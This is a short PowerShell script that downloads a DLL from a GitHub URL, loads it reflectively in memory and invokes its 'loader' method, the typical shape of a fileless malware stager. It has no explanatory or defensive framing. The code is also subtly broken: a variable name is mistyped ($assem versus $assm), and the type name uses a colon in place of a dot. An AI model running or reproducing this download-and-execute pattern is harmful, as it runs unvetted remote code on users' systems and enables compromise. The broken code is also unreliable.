﻿$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/mikewebcti/Nov22/raw/main/CTI2.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assm.GetType("ClassLibrary1:Class1")
$method = $class.GetMethod("loader")
$method.Invoke(0, $null)
